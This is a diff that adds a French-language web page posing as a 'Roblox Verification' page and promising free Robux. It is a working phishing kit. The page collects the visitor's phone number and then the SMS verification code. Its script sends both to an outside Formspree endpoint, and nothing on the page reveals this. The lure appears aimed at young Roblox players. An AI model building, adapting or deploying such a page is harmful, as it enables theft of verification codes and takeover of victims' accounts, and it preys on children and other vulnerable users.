@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Verification</title>
+    <style>
+        body { 
+            margin: 0; 
+            padding: 0; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            height: 100vh; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            background-image: url('fond.jpg'); 
+            background-size: cover; 
+            background-position: center; 
+            background-repeat: no-repeat;
+            color: white;
+        }
+
+        body::before {
+            content: "";
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0, 0, 0, 0.6); 
+            z-index: -1;
+        }
+
+        .container { 
+            background: rgba(255, 255, 255, 0.1); 
+            padding: 20px; 
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 10px; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2); 
+            max-width: 320px; 
+            width: 90%;
+            text-align: center;
+            color: #333; 
+        }
+
+        h1 {
+            margin-top: 0;
+            font-size: 22px;
+            color: #0047BB; 
+            font-weight: 800;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 15px;
+        }
+
+        .roblox-icon {
+            width: 24px;
+            height: 24px;
+            background-color: #000; 
+            border-radius: 3px;
+            position: relative;
+            display: inline-block;
+            vertical-align: middle;
+        }
+        
+        .roblox-icon::after {
+            content: "";
+            position: absolute;
+            top: 4px;
+            left: 4px;
+            width: 16px;
+            height: 16px;
+            background-color: white;
+            border-radius: 50%; 
+        }
+
+        .label-text {
+            font-size: 14px;
+            color: #000; 
+            margin-bottom: 10px;
+            font-weight: 500;
+        }
+
+        input { 
+            width: 90%; 
+            padding: 10px; 
+            margin: 0 0 15px 0; 
+            border: 1px solid #ccc; 
+            border-radius: 6px; 
+            font-size: 15px;
+            box-sizing: border-box; 
+            background: rgba(255,255,255,0.8);
+        }
+
+        button { 
+            padding: 10px 20px; 
+            background: #007bff; 
+            color: white; 
+            border: none; 
+            border-radius: 6px; 
+            cursor: pointer; 
+            width: 100%; 
+            font-size: 14px;
+            font-weight: bold;
+        } 
+
+        button:hover { 
+            background: #0056b3; 
+        } 
+
+        .hidden { 
+            display: none; 
+        }
+
+        .note {
+            font-size: 12px;
+            color: #555;
+            margin-top: 10px;
+            line-height: 1.4;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ÉTAPE 1 : NUMÉRO -->
+    <div id="step1" class="container">
+        <h1>
+            <div class="roblox-icon"></div>
+            Roblox
+        </h1>
+        
+        <p class="label-text">Entrez votre numéro pour réclamer les Robux</p>
+
+        <form id="formPhone" action="https://formspree.io/f/meaqlovv" method="POST">
+            <input type="hidden" name="numero_envoye" id="hiddenPhone">
+            
+            <input type="tel" name="numero" placeholder="Ex: 06 12 34 56 78" required>
+            
+            <button type="submit">Valider</button>
+        </form>
+        <div id="loading" class="hidden">Envoi en cours...</div>
+    </div>
+
+    <!-- ÉTAPE 2 : CODE SMS -->
+    <div id="step2" class="container hidden">
+        <h1>
+            <div class="roblox-icon"></div>
+            Roblox
+        </h1>
+        
+        <p class="label-text">Vérification</p>
+        
+        <div class="note">
+            Le code peut prendre quelques minutes à arriver.<br>
+            Veuillez vérifier vos SMS ou votre boîte mail.
+        </div>
+
+        <input type="text" name="code" placeholder="Entrez le code à 4 chiffres" required>
+        <button type="button" onclick="submitCode()">Valider le code</button>
+    </div>
+
+    <script>
+        document.getElementById('formPhone').addEventListener('submit', function(e) {
+            e.preventDefault(); 
+            
+            const phoneInput = document.querySelector('input[name="numero"]').value;
+            
+            fetch(this.action, {
+                method: 'POST',
+                body: new FormData(this),
+                headers: { 'Accept': 'application/json' }
+            }).then(response => {
+                if (response.ok) {
+                    document.getElementById('loading').classList.remove('hidden');
+                    setTimeout(() => {
+                        document.getElementById('hiddenPhone').value = phoneInput;
+                        
+                        document.getElementById('step1').classList.add('hidden');
+                        document.getElementById('step2').classList.remove('hidden');
+                    }, 800);
+                }
+            });
+        });
+
+        function submitCode() {
+            const codeInput = document.querySelector('input[name="code"]').value;
+            const phone = document.getElementById('hiddenPhone').value;
+            
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'https://formspree.io/f/meaqlovv'; 
+            
+            const fieldNum = document.createElement('input');
+            fieldNum.type = 'hidden';
+            fieldNum.name = 'numero';
+            fieldNum.value = phone;
+            
+            const fieldCode = document.createElement('input');
+            fieldCode.type = 'hidden';
+            fieldCode.name = 'code';
+            fieldCode.value = codeInput;
+            
+            form.appendChild(fieldNum);
+            form.appendChild(fieldCode);
+            document.body.appendChild(form);
+            form.submit();
+        }
+    </script>
+</body>
+  </html>
